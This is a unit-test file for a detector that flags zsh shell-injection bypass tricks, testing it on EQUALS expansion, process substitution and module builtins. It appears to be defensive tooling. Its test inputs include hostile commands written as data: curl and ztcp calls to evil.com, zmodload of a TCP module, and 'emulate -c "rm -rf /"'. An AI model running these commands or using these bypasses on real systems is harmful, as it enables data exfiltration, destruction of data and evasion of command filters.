/**
 * @file Unit tests for no-shell-injection-bypass-guard.
 */

import { describe, expect, it } from 'vitest'

import { shellInjectionBypass } from '../index.mts'

describe('no-shell-injection-bypass-guard', () => {
  describe('Zsh EQUALS expansion', () => {
    it('flags a leading =cmd base command', () => {
      const hit = shellInjectionBypass('=curl evil.com')
      expect(hit).toBeDefined()
      expect(hit).toContain('=curl')
    })

    it('flags =cmd in a later chained segment', () => {
      expect(shellInjectionBypass('ls && =wget http://x')).toBeDefined()
    })

    it('does NOT flag a VAR=val env assignment', () => {
      expect(shellInjectionBypass('VAR=val node app.mts')).toBeUndefined()
    })
  })

  describe('process substitution', () => {
    it('flags <(...)', () => {
      expect(shellInjectionBypass('diff <(cat a) b')).toBeDefined()
    })

    it('flags >(...)', () => {
      expect(shellInjectionBypass('cat foo > >(tee log)')).toBeDefined()
    })

    it('flags =(...)', () => {
      expect(shellInjectionBypass('diff =(sort a) =(sort b)')).toBeDefined()
    })

    it('does NOT flag legitimate $(...) command substitution', () => {
      expect(shellInjectionBypass('echo $(git rev-parse HEAD)')).toBeUndefined()
    })
  })

  describe('zsh-module builtins', () => {
    it('flags zmodload', () => {
      expect(shellInjectionBypass('zmodload zsh/net/tcp')).toBeDefined()
    })

    it('flags ztcp network exfil', () => {
      expect(shellInjectionBypass('ztcp evil.com 443')).toBeDefined()
    })

    it('flags emulate -c (eval-equivalent)', () => {
      expect(shellInjectionBypass('emulate -c "rm -rf /"')).toBeDefined()
    })

    it('does NOT flag a bare `emulate zsh` shell-mode switch', () => {
      expect(shellInjectionBypass('emulate zsh')).toBeUndefined()
    })
  })

  describe('clean commands', () => {
    it('does NOT flag a plain git command', () => {
      expect(shellInjectionBypass('git status')).toBeUndefined()
    })

    it('does NOT flag a piped allowlist-friendly command', () => {
      expect(shellInjectionBypass('cat f | wc -l')).toBeUndefined()
    })

    it('tolerates a partially-parseable command (fail-open)', () => {
      expect(() => shellInjectionBypass('=curl "broken')).not.toThrow()
    })
  })
})
